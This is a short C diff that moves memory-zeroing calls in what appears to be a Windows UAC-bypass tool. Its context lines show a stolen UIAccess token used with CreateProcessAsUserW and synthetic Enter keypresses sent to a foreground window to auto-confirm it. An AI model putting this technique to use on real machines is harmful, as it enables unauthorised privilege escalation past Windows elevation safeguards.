@@ -11,13 +11,13 @@ static BOOL CALLBACK EnumWindowsCallback
 	WCHAR wszWindowName[0x200];
 	INPUT Inputs[2];
 
+	SecureZeroMemory(wszWindowName, sizeof(wszWindowName));
+	SecureZeroMemory(&Inputs, sizeof(Inputs));
 	GetWindowThreadProcessId(hWnd, &dwPID);
 	if (dwPID == pStruct->dwPID) {
-		SecureZeroMemory(wszWindowName, sizeof(wszWindowName));
 		GetWindowTextW(hWnd, wszWindowName, _countof(wszWindowName));
 		if (!lstrcmpW(wszWindowName, pStruct->wszWindowsName)) {
 			SetForegroundWindow(hWnd);
-			SecureZeroMemory(&Inputs, sizeof(Inputs));
 			Inputs[0].type = INPUT_KEYBOARD;
 			Inputs[0].ki.wVk = VK_RETURN;
 			Inputs[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;
@@ -64,13 +64,13 @@ BOOL BypassBycomMgmtLauncher
 	PROCESS_INFORMATION pi;
 	BOOL bResult = FALSE;
 
+	SecureZeroMemory(&si, sizeof(si));
+	SecureZeroMemory(&pi, sizeof(pi));
 	hStealedToken = GetUiAccessToken();
 	if (hStealedToken == NULL) {
 		goto END;
 	}
 
-	SecureZeroMemory(&si, sizeof(si));
-	SecureZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
 	if (!CreateProcessAsUserW(hStealedToken, NULL, lpCommand, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
 		goto END;
